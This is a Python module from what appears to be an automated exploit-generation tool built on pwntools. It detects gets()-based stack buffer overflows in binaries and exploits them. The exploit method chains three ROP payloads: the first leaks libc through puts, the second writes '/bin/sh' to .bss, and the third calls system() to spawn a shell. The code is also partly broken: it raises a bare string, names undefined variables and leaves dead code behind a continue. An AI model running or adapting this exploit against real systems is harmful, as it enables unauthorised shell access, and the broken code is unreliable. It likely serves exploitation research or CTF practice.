import smrop
import logging
import json
import time

import pwn

logger = logging.getLogger('ashnazg')

ANALYSES = []
def register(clazz):
    # TODO: probably don't want to instantiate
    # here, makes more sense to instantiate
    # when the program context is available.
    ANALYSES.append(clazz)
    return clazz

class Vulnerability:

    @staticmethod
    def detect(context, function, program):
        raise NotImplementedError()
    
    # Probably don't care about this interface, we instantiate in detect
    def __init__(self, function, binary : pwn.ELF, libc : pwn.ELF):
        raise NotImplementedError()
    
    def exploit(self, function):
        raise NotImplementedError()

# These should probably be factored out into a separate
# function analysis module and be part of a Variable class or something
def isLocal(name, function):
    return name in [v["name"] for v in function["variables"]]

def isParameter(name, function):
    return name in function["arguments"]

def getLocal(name, function):
    for v in function["variables"]:
        if v["name"] == name:
            return v

@register
class StackBufferOverflowVulnerability(Vulnerability):
    name = "StackBufferOverflowVulnerability"
    short_name = "sbo"
    options = [("suffix", "str", "Ouput immediately after the buffer overflow call.")]

    def __init__(self,
            function,
            binary : pwn.ELF,
            libc : pwn.ELF,
            targetFunc,
            functionExit,
            stackOffset,
            suffix,
            initial):
        self.function = function
        self.binary = binary
        self.libc = libc
        self.targetFunc = targetFunc
        self.stackOffset = stackOffset
        self.functionExit = functionExit
        self.suffix = suffix
        self.initial = initial
    
    def __str__(self):
        fields = {
            "vulnerability": "StackBufferOverflowVulnerability",
            "function": str(self.function["name"]),
            "binary": str(self.binary),
            "libc": str(self.libc),
            "targetFunc": str(self.targetFunc),
            "stackOffset": str(self.stackOffset),
            "options": {
                "sbo.suffix": str(self.suffix),
                "sbo.initial": str(self.initial)
            }
        }
        return json.dumps(fields, indent=2)

    @staticmethod
    def detect(context, function, program, options):
        for call in function["calls"]:
            if call["funcName"] == "gets":
                targetFunc = call
                # assume stack for now
                # need to add check to validate
                # that the argument is on the stack.
                # otherwise, this is not exploitable
                # via this technique
                # TODO: Add check
                arg = call["arguments"][0]
                arg = [v for v in function["variables"] if v["name"] == arg][0]
                stackOffset = arg["stackOffset"]
                # TODO: automatically determine "suffix"
                suffix = options.get("sbo.suffix", None)
                initial = options.get("sbo.initial", None)
                if suffix:
                    suffix = suffix.replace("\\n", "\n")
                initial = options.get("sbo.initial", None)
                if initial:
                    initial = initial.replace("\\n", "\n")

                return StackBufferOverflowVulnerability(function,
                    context.binary,
                    context.libc,
                    targetFunc=targetFunc,
                    functionExit=function["exitAddresses"][0],
                    stackOffset=stackOffset,
                    suffix=suffix,
                    initial=initial)
                    
            # Work in progress apparently
            # Notes, uses old construction logic, need to update when you get around
            # to it
            continue
            if call["funcName"] == "read":
                targetBuffer = call["arguments"][1]
                # TODO: add analysis to ghidra to export type info
                # here to figure out if it's a variable or a constant
                targetSize = int(call["arguments"][2], 16)
                if isLocal(targetBuffer, function):
                    stackOffset = -getLocal(targetBuffer, function)["stackOffset"]
                    if targetSize > stackOffset:
                        self.targetFunc = call
                        self.stackOffset = stackOffset
                        return BufferOverflow
                # TODO: find calls to functions for potentially vulnerable 
                # variables.
                return None
        return None

    def entry(self):
        return int(self.function["address"], 16)

    # TODO: gate on detect
    def exploit(self, conn):
        sconn = conn.conn
        logger.info(sconn)
        function_addr = int(self.function["address"], 16) 
        target_func = int(self.targetFunc["address"], 16)
        func_exit = int(self.functionExit, 16)
        
        prefix = b"A"*abs(self.stackOffset)

        # leak libc location
        sm = smrop.Smrop(binary=self.binary, libc=self.libc)
        sm.prefix(prefix)
        sm.pop_rdi(self.binary.got["gets"])
        # TODO: make puts a dependency
        # TODO: abstract out puts to any print
        sm.ret("puts", 'binary')
        sm.ret(function_addr, "binary")
        payload1 = sm.resolve(binary=0x0, libc=0x0)

        # Navigate to targetFunc
        if self.initial:
            logger.info("Using provided intial value to clear stdout")
            res = sconn.recvuntil(self.initial)
            logger.debug(f"Initial: {res}")
        else:
            logger.info("Navigating to invocation of target input function.")
            conn.navigate(target_func)

        # read libc location
        logger.info("Sending first payload (to leak 'gets' location)")
        logger.info(f"{conn.conn}")
        logger.info(f"{sconn}")
      
        print(payload1) 
        #time.sleep(.1)
        #conn.conn.send(payload1) 
        conn.model.sendline(payload1)
        print("model callstack after", conn.model.state.callstack)

        # Need to perform drain of non libc stuff
        if self.suffix:
            logger.info(f"Attempting to receive provided suffix: {suffix}")
            res = sconn.recvuntil(self.suffix)
            logger.debug(f"Received suffix: {res}")
        else:
            logger.info("Navigating to function exit")
            conn.navigate(func_exit)
            print("After navigating to func_exit:", conn.model.simgr.active)
        logger.info(f"{conn.conn}")
        logger.info(f"{sconn}")
        
        # Alright! We've navigated to the function exit!
        # Unfortunately, we're now in a pickle. The model
        # will now drift from the actual output.

        # fake calling puts
        logger.info(f"After navigating to func_exit and before stepping: {conn.model.simgr.active}")
        rsp = conn.model.state.regs.rsp 
        conn.model.state.regs.rsp = rsp
        for i in range(16):
            return_addr = conn.model.state.memory.load(rsp - 8*i , 8)
            logger.info(f"After navigating to func_exit and before stepping [return]: {return_addr}")
        rsp = conn.model.state.regs.rsp + 8
        conn.model.state.regs.rsp = rsp
        conn.model.simgr.active.clear()
        conn.model.simgr.active.append(conn.model.state)

        logger.info(f"Rsp is {rsp}")
        # TODO: simulate output
        logger.info(f"{conn.model.simgr.active[0].callstack}")
        conn.model.simgr.step()
        logger.info(f"After navigating to func_exit and stepping: {conn.model.simgr.active} {conn.model.simgr}")
        logger.info(f"{conn.model.simgr.active[0].callstack}")

        logger.info(f"After navigating to func_exit and stepping: {conn.model.simgr.active}")
        print("Value of stdin after stepping", conn.model.state.posix.dumps(0))
        print("Value of rsp after stepping", rsp)

        # TODO: The model doesn't see this
        # We've hit the return, next output is now the 'gets' address
        #time.sleep(.1)
        sconn.sendline(payload1) 
        gets_location = sconn.recvline()[:-1]
        logger.debug(f"gets_location: {gets_location}")
        gets_location = int.from_bytes(gets_location, byteorder='little')
        libcoffset = gets_location - self.libc.symbols["gets"]
        logger.info("Libc found at {}".format(hex(libcoffset)))
        
        # Alright! The model is mostly in the same state as the connection
        # again.

        # need to navigate back to the targetFunc
        if self.initial:
            logger.info("Using provided intial value to clear stdout")
            sconn.recvuntil(self.initial)
        else:
            logger.info(f"Navigating to targetFunc from {conn.model.simgr.active}")
            conn.navigate(target_func)

        # send /bin/sh
        target_heap_address = self.binary.bss() + 0x100
        sm = smrop.Smrop(binary=self.binary, libc=self.libc)
        sm.prefix(prefix)
        sm.pop_rdi(target_heap_address)
        sm.ret("gets", "binary")
        sm.ret(function_addr, "binary")
        payload2 = sm.resolve(binary=0x0)
        
        logger.info("Sending second payload (setup write to controlled memory)")
        sconn.sendline(payload2)
        conn.model.sendline(payload2) # update model
        raise("this may have not worked")
        logger.info("Navigating to return.")
        if self.suffix:
            logger.info(f"Attempting to receive provided suffix: {suffix}")
            res = sconn.recvuntil(self.suffix)
            logger.debug(f"Received suffix: {res}")
        else:
            logger.info("Navigating to function exit")
            conn.navigate(func_exit)

        # fake calling puts
        rsp = conn.model.state.regs.rsp + 16
        conn.model.state.regs.rsp = rsp
        # TODO: simulate output
        conn.model.simgr.step()

        # we have exited the function, we can now
        # write /bin/sh to a controlled part of memory
        logger.info(f"Writing '/bin/sh' to {hex(target_heap_address)}")
        bin_sh = b"/bin/sh\x00"
        sconn.sendline(bin_sh)
        conn.model.sendline(bin_sh)

        # need to navigate back to the targetFunc
        if self.initial:
            logger.info(f"Attempting to read provided initial: {initial}")
            sconn.recvuntil(self.initial)
            logger.debug(f"Received initial: {initial}")
        else:
            logger.info("Navigating to targetFunc.")
            conn.navigate(target_func)

        sm = smrop.Smrop(binary=self.binary, libc=self.libc)
        sm.prefix(prefix)
        sm.pop_rdi(target_heap_address)
        sm.nop()
        sm.ret("system", "libc")

        payload3 = sm.resolve(binary=0x0, libc=libcoffset)

        logger.info("Sending final payload (invoke system('bin/sh'))")
        sconn.sendline(payload3)
        conn.model.sendline(payload3)
        
        # Payload sent, now exit the function.
        if self.suffix:
            logger.info(f"Attempting to receive provided suffix: {suffix}")
            res = sconn.recvuntil(self.suffix)
            logger.debug(f"Received suffix: {res}")
        else:
            logger.info("Navigating to function exit")
            conn.navigate(func_exit)
        
        logger.info("We should now have a shell.")
